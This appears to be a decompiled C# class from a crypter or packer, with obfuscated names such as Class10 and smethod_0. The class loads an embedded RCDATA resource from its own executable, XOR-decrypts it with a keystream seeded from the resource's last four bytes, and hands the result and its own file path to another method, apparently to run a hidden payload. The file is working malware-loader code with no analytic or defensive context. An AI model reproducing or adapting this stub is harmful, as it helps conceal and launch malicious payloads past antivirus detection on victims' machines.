using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[StandardModule]
internal sealed class Class10
{
	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr FindResource(IntPtr intptr_0, string string_0, string string_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SizeofResource(IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadResource(IntPtr intptr_0, IntPtr intptr_1);

	public static void smethod_0()
	{
		string string_ = Process.GetCurrentProcess().MainModule!.ModuleName;
		IntPtr moduleHandleA = GetModuleHandleA(ref string_);
		IntPtr intptr_ = FindResource(moduleHandleA, "0", "RT_RCDATA");
		IntPtr source = LoadResource(moduleHandleA, intptr_);
		int num = SizeofResource(moduleHandleA, intptr_);
		checked
		{
			byte[] array = new byte[num - 1 + 1];
			Marshal.Copy(source, array, 0, num);
			int seed = BitConverter.ToInt32(array, array.Length - 4);
			array = (byte[])Utils.CopyArray((Array)array, (Array)new byte[array.Length - 3 + 1]);
			Random random = new Random(seed);
			byte[] array2 = new byte[array.Length - 1 + 1];
			random.NextBytes(array2);
			int num2 = array.Length - 1;
			int num3 = 0;
			while (true)
			{
				int num4 = num3;
				int num5 = num2;
				if (num4 > num5)
				{
					break;
				}
				array[num3] = unchecked((byte)(array[num3] ^ array2[num3]));
				num3++;
			}
			Form1.GClass0.smethod_2(array, Process.GetCurrentProcess().MainModule!.FileName);
		}
	}
}
